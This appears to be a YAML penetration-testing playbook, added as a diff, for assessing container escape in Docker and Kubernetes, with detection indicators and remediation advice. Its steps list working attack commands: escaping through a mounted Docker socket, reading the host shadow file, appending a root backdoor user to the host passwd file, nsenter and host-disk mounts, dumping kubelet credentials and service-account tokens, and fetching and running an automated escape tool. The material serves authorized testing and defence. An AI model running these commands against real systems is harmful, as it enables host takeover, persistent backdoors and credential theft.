@@ -1,0 +1,217 @@
+# Category: Cloud Security - Container Security
+name: "Container Escape Techniques Assessment"
+id: "cloud-container-escape-001"
+category: "cloud_security"
+subcategory: "container_security"
+difficulty: "advanced"
+estimated_time: "90 minutes"
+
+description: |
+  Assess container security by testing for common escape techniques including
+  privileged container abuse, host path volume exploitation, Docker socket
+  exposure, and namespace misconfigurations. Used in authorized penetration
+  tests of containerized environments.
+
+learning_objectives:
+  - Identify misconfigured container deployments enabling escape
+  - Test privileged container abuse and host namespace access
+  - Exploit exposed Docker socket for host compromise
+  - Detect and remediate container escape vulnerabilities
+
+tools:
+  - docker
+  - kubectl
+  - trivy
+  - falco
+  - nsenter
+  - cdk_tool
+
+prerequisites:
+  - Access to a containerized environment (authorized)
+  - Docker or kubectl CLI tools
+  - Understanding of Linux namespaces and cgroups
+  - Written authorization from system owner
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Enumerate container environment and capabilities"
+    commands:
+      - "# Check if running inside a container"
+      - "cat /proc/1/cgroup | grep -i 'docker\\|kubepods\\|containerd'"
+      - "ls /.dockerenv 2>/dev/null && echo 'Inside Docker container'"
+      - "# Check assigned capabilities"
+      - "cat /proc/self/status | grep CapEff"
+      - "capsh --decode=$(cat /proc/self/status | grep CapEff | awk '{print $2}')"
+      - "# Check if privileged"
+      - "ip link add dummy0 type dummy 2>/dev/null && echo 'Privileged: YES — net admin works' || echo 'Not fully privileged'"
+      - "# Check mounted volumes"
+      - "mount | grep -v 'proc\\|sys\\|cgroup\\|devpts\\|tmpfs'"
+      - "# Check environment variables for secrets"
+      - "env | grep -iE 'key\\|token\\|secret\\|password\\|credential'"
+    expected_output: "Container capabilities, privilege level, mounted volumes, and environment secrets"
+    detection: "Capability enumeration visible in container process logs"
+
+  - id: "step2"
+    phase: "enumeration"
+    action: "Check for Docker socket exposure"
+    commands:
+      - "# Check if Docker socket is mounted"
+      - "ls -la /var/run/docker.sock 2>/dev/null"
+      - "find / -name 'docker.sock' 2>/dev/null"
+      - "# If socket exists — full host access"
+      - "docker -H unix:///var/run/docker.sock ps 2>/dev/null"
+      - "docker -H unix:///var/run/docker.sock images 2>/dev/null"
+      - "# Escape via Docker socket — mount host filesystem"
+      - "docker -H unix:///var/run/docker.sock run -v /:/hostfs -it alpine chroot /hostfs /bin/sh"
+      - "# Read host files"
+      - "docker -H unix:///var/run/docker.sock run -v /etc:/host_etc -it alpine cat /host_etc/shadow"
+      - "# Add backdoor user on host"
+      - "docker -H unix:///var/run/docker.sock run -v /etc:/host_etc -it alpine sh -c 'echo \"backdoor:x:0:0:root:/root:/bin/bash\" >> /host_etc/passwd'"
+    expected_output: "Host filesystem access and process listing via Docker socket"
+    detection: "Docker API calls from container process; new container creation with host volume mounts"
+
+  - id: "step3"
+    phase: "exploitation"
+    action: "Privileged container escape via host namespace"
+    commands:
+      - "# Confirm privileged mode"
+      - "cat /proc/self/status | grep CapEff"
+      - "# Mount host filesystem via /dev"
+      - "fdisk -l 2>/dev/null | grep '^/dev'"
+      - "mkdir /tmp/hostfs"
+      - "mount /dev/sda1 /tmp/hostfs 2>/dev/null || mount /dev/xvda1 /tmp/hostfs"
+      - "ls /tmp/hostfs"
+      - "# Chroot to host"
+      - "chroot /tmp/hostfs /bin/bash"
+      - "# Alternative: nsenter to host PID 1 namespace"
+      - "nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash"
+      - "# Verify host access"
+      - "hostname && cat /etc/hostname"
+      - "ps aux | grep -v 'containerd\\|dockerd'"
+    expected_output: "Shell on host system via privileged container namespace escape"
+    detection: "nsenter or mount of host disk from container; host PID namespace access"
+
+  - id: "step4"
+    phase: "exploitation"
+    action: "HostPath volume exploitation"
+    commands:
+      - "# Check for sensitive host paths mounted into container"
+      - "mount | grep '/host\\|/node\\|/hostfs'"
+      - "ls /host 2>/dev/null"
+      - "# Common sensitive hostPath mounts"
+      - "ls /host/etc/kubernetes/ 2>/dev/null"
+      - "ls /host/var/lib/kubelet/ 2>/dev/null"
+      - "# Read kubelet credentials"
+      - "cat /host/etc/kubernetes/kubelet.conf 2>/dev/null"
+      - "cat /host/var/lib/kubelet/config.yaml 2>/dev/null"
+      - "# Access kubelet kubeconfig for node-level access"
+      - "kubectl --kubeconfig=/host/etc/kubernetes/kubelet.conf get pods --all-namespaces 2>/dev/null"
+      - "# Read service account tokens from other pods"
+      - "find /host/var/lib/kubelet/pods/ -name 'token' 2>/dev/null | head -5 | xargs cat"
+    expected_output: "Kubernetes credentials or host sensitive files accessible via hostPath mount"
+    detection: "Access to /etc/kubernetes/ or kubelet config from container process"
+
+  - id: "step5"
+    phase: "exploitation"
+    action: "Kubernetes service account token abuse"
+    commands:
+      - "# Read mounted service account token"
+      - "cat /var/run/secrets/kubernetes.io/serviceaccount/token"
+      - "cat /var/run/secrets/kubernetes.io/serviceaccount/namespace"
+      - "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt | openssl x509 -text -noout | grep -E 'Issuer|Subject'"
+      - "# Query Kubernetes API with token"
+      - "export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
+      - "export API=$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}' 2>/dev/null || echo 'https://kubernetes.default.svc')"
+      - "curl -sk $API/api/v1/namespaces -H \"Authorization: Bearer $TOKEN\" | python3 -m json.tool 2>/dev/null | grep name"
+      - "# Check own permissions"
+      - "kubectl auth can-i --list 2>/dev/null"
+      - "# Check for cluster-admin"
+      - "kubectl auth can-i '*' '*' 2>/dev/null"
+      - "# Try to create privileged pod for escape"
+      - "kubectl get pods --all-namespaces 2>/dev/null"
+    expected_output: "Kubernetes API access scope using service account token"
+    detection: "Kubernetes API calls from pod SA token; kubectl commands from within pod"
+
+  - id: "step6"
+    phase: "exploitation"
+    action: "Automated container escape with CDK"
+    commands:
+      - "# CDK (Container DucK) — automated container escape tool"
+      - "wget https://github.com/cdk-team/CDK/releases/latest/download/cdk_linux_amd64 -O /tmp/cdk"
+      - "chmod +x /tmp/cdk"
+      - "# Evaluate all escape techniques"
+      - "/tmp/cdk evaluate --full"
+      - "# Try all exploits automatically"
+      - "/tmp/cdk auto-escape"
+      - "# Specific exploits"
+      - "/tmp/cdk run docker-sock-check"
+      - "/tmp/cdk run mount-disk"
+      - "/tmp/cdk run k8s-secret-dump-all"
+      - "/tmp/cdk run k8s-psp-dump"
+    expected_output: "Automated escape assessment with identified and attempted escape paths"
+    detection: "CDK binary execution; automated API enumeration patterns"
+
+compliance_controls:
+  - standard: "CIS Docker Benchmark v1.6"
+    control: "5.4"
+    description: "Do not use privileged containers"
+  - standard: "CIS Kubernetes Benchmark v1.8"
+    control: "5.2.1"
+    description: "Minimize privileged containers"
+  - standard: "NIST 800-53 Rev5"
+    control: "SC-39"
+    description: "Process isolation"
+  - standard: "PCI DSS v4.0"
+    control: "2.2.1"
+    description: "System components hardened per vendor/industry standards"
+
+detection:
+  network_indicators:
+    - "Unexpected Kubernetes API calls from pod service account"
+    - "Container making outbound connections to host metadata service"
+    - "Docker API calls via Unix socket from within container"
+  log_indicators:
+    - "Falco alert: Container running as privileged"
+    - "Falco alert: Mount of sensitive host path in container"
+    - "Kubernetes audit: ServiceAccount creating pods in kube-system"
+    - "Docker daemon log: New container spawned with --privileged"
+  endpoint_indicators:
+    - "nsenter process execution in container"
+    - "Host disk device mount from container"
+    - "CDK or similar tool binary in container filesystem"
+
+remediation:
+  immediate:
+    - "Remove privileged: true from all container security contexts"
+    - "Remove hostPath mounts of sensitive directories"
+    - "Restrict Docker socket access — never mount /var/run/docker.sock"
+    - "Implement Pod Security Standards (Restricted profile)"
+  long_term:
+    - "Deploy Falco for runtime container threat detection"
+    - "Implement OPA/Gatekeeper to enforce Pod Security Policies"
+    - "Use read-only root filesystem for all containers"
+    - "Implement least-privilege RBAC for all service accounts"
+    - "Run Trivy or Grype in CI/CD for image vulnerability scanning"
+
+variables:
+  target_container: "webapp-container"
+  kubernetes_namespace: "default"
+  host_device: "/dev/sda1"
+
+assessment_questions:
+  - "What Linux capability enables nsenter-based privileged container escape?"
+  - "Why is mounting /var/run/docker.sock into a container a critical risk?"
+  - "How does a hostPath volume with '/' path enable container escape?"
+  - "What Kubernetes Pod Security Standard prevents privileged containers?"
+  - "How does CDK automate container escape detection?"
+
+references:
+  - url: "https://github.com/cdk-team/CDK"
+    title: "CDK - Container Escape Tool"
+  - url: "https://bishopfox.com/blog/kubernetes-pod-privilege-escalation"
+    title: "Kubernetes Pod Privilege Escalation"
+  - url: "https://falco.org/docs/rules/"
+    title: "Falco Runtime Security Rules"
+  - url: "https://kubernetes.io/docs/concepts/security/pod-security-standards/"
+    title: "Kubernetes Pod Security Standards"
